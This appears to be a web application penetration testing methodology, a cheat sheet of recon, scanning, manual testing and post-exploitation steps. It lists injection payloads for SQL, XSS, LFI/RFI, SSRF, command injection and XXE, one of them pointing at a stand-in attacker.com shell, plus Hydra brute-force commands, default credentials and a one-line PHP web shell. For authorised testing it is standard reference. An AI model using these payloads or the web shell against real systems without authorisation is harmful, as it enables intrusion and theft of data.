# Web Application Penetration Testing Methodology

## Overview
Web applications run on HTTP (80, 8080, 8000, 3000, 5000) and HTTPS (443, 8443) ports. This methodology covers systematic web application testing.

## Initial Reconnaissance

### 1. Technology Fingerprinting
```bash
# WhatWeb
whatweb http://{target}

# Wappalyzer CLI
wappalyzer http://{target}

# Nmap HTTP scripts
nmap -sV -sC -p80,443 --script=http-* {target}
```

Identify:
- Web server (Apache, Nginx, IIS)
- Framework (Django, Rails, Laravel, Spring)
- CMS (WordPress, Drupal, Joomla)
- Programming language (PHP, Python, Java, .NET)

### 2. SSL/TLS Analysis (HTTPS)
```bash
# SSLScan
sslscan {target}

# TestSSL
testssl.sh {target}

# SSLyze
sslyze {target}
```

Check for:
- Weak protocols (SSLv2, SSLv3, TLS 1.0)
- Weak ciphers
- Certificate issues
- HSTS header

### 3. Header Analysis
```bash
curl -I http://{target}
```

Security headers to check:
- X-Frame-Options
- X-Content-Type-Options
- X-XSS-Protection
- Content-Security-Policy
- Strict-Transport-Security

## Content Discovery

### 1. Directory/File Bruteforce
```bash
# Gobuster
gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 50

# Feroxbuster (recursive)
feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt

# Dirsearch
dirsearch -u http://{target}

# FFUF
ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### 2. Common Files to Check
- `/robots.txt` - disallowed paths
- `/sitemap.xml` - site structure
- `/.git/` - exposed git repository
- `/.svn/` - exposed SVN
- `/backup/`, `/old/`, `/dev/` - backup directories
- `/admin/`, `/administrator/`, `/manager/`
- `/api/`, `/api/v1/`, `/swagger/`, `/api-docs/`
- `/phpinfo.php`, `/info.php`
- `/.env`, `/config.php`, `/wp-config.php`

### 3. Virtual Host Discovery
```bash
# FFUF vhost enumeration
ffuf -u http://{target} -H "Host: FUZZ.{target}" -w subdomains.txt -fs {size}

# Gobuster vhost
gobuster vhost -u http://{target} -w subdomains.txt
```

## Vulnerability Scanning

### 1. Nikto
```bash
nikto -h http://{target}
```

### 2. Nuclei
```bash
# Full scan
nuclei -u http://{target}

# Specific tags
nuclei -u http://{target} -tags cve,misconfig,exposure

# Critical/High only
nuclei -u http://{target} -severity critical,high
```

### 3. WPScan (WordPress)
```bash
wpscan --url http://{target} --enumerate vp,vt,u
```

### 4. Droopescan (Drupal/Joomla)
```bash
droopescan scan drupal -u http://{target}
```

## Manual Testing

### 1. SQL Injection
```bash
# SQLmap
sqlmap -u "http://{target}/page?id=1" --batch --dbs

# Manual testing
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL--
```

### 2. XSS (Cross-Site Scripting)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
```

### 3. LFI/RFI (File Inclusion)
```
# LFI
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=/etc/passwd%00
?file=php://filter/convert.base64-encode/resource=index.php

# RFI
?file=http://attacker.com/shell.txt
```

### 4. SSRF (Server-Side Request Forgery)
```
?url=http://127.0.0.1
?url=http://localhost
?url=http://169.254.169.254/  # AWS metadata
?url=file:///etc/passwd
```

### 5. Command Injection
```bash
; id
| id
`id`
$(id)
& id
&& id
|| id
```

### 6. XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## Authentication Testing

### 1. Default Credentials
- admin:admin
- admin:password
- admin:123456
- root:root
- test:test

### 2. Brute Force
```bash
# Hydra HTTP POST
hydra -L users.txt -P passwords.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Hydra HTTP Basic Auth
hydra -L users.txt -P passwords.txt {target} http-get /admin/
```

### 3. Session Testing
- Session fixation
- Session hijacking
- Cookie security flags (HttpOnly, Secure)
- Session timeout

## API Testing

### 1. Discovery
```bash
# Common API paths
/api/
/api/v1/
/api/v2/
/swagger/
/swagger-ui/
/api-docs/
/openapi.json
```

### 2. Testing
- Authentication bypass
- IDOR (Insecure Direct Object Reference)
- Mass assignment
- Rate limiting
- Input validation

## Metasploit Modules

```bash
# Directory scanner
use auxiliary/scanner/http/dir_scanner

# File scanner
use auxiliary/scanner/http/files_dir

# HTTP version
use auxiliary/scanner/http/http_version

# SSL certificate
use auxiliary/scanner/http/cert

# WordPress scanner
use auxiliary/scanner/http/wordpress_scanner

# Tomcat manager
use auxiliary/scanner/http/tomcat_mgr_login
```

## Post-Exploitation

### Web Shell Upload
If file upload is possible:
```php
<?php system($_GET['cmd']); ?>
```

### Database Access
- Extract database credentials from config files
- Dump database contents
- Look for password hashes

## Reporting Checklist

- [ ] Technology stack identified
- [ ] All endpoints discovered
- [ ] SQL injection tested
- [ ] XSS tested (reflected, stored, DOM)
- [ ] Authentication tested
- [ ] Authorization tested (IDOR)
- [ ] File upload tested
- [ ] Business logic tested
- [ ] API security tested
- [ ] SSL/TLS configuration reviewed
- [ ] Security headers reviewed
